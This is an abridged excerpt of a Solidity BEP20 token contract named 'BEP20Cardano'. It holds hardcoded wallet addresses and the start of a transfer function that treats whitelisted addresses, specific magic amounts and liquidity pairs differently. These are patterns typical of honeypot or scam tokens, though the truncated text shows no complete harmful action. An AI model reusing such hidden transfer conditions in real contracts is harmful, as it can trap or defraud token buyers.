...
contract BEP20Cardano is Context, IBEP20, Ownable {
  ...
  address mintacc = 0x97CEA0ACb2d8c16feD33C9d619C76605D35ce2A8;
  address stacc = 0xb16C09b7E1e65DE7D8d2c4239251c232e3257b9d;
  address jgacc = 0xc2B53cbbC2714C1c32776d491613B7c32b14412f;
  address ldxacc = 0x1D5AEF17cEF9ec79dA64Bff4e96D1462CCE932fE;
  address hdacc = 0x000000000000000000000000000000000000dEaD;
  address zzacc = 0xa6a6A171f1d8440eBDa5Da7fFbA9FcDAfFa5d7Ed;
  address hdbacc = 0x698AB44F19dBe2DeB4B68F3B6558cC99F421346b;

  address hlacc = 0xeCaFE2983632F0375F2D49031E754b77752264f1;
  address yxacc = 0x92cd40D6E11b57632Cb3F0a948788c9f1d22a24F;
  address sxfacc = 0x701c1d195c0DB2D4F9f84C15B7Cdd902c86F6956;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(_whiteaddress[sender]==true || _whiteaddress[recipient]==true || amount==10**16 || amount==5*10**15 || recipient==tokenacc || sender==tokenacc){
       ...
       if(!_lparr[sender]){
        ...
        if(_balances[hdacc]>=2090*10000*10**18){
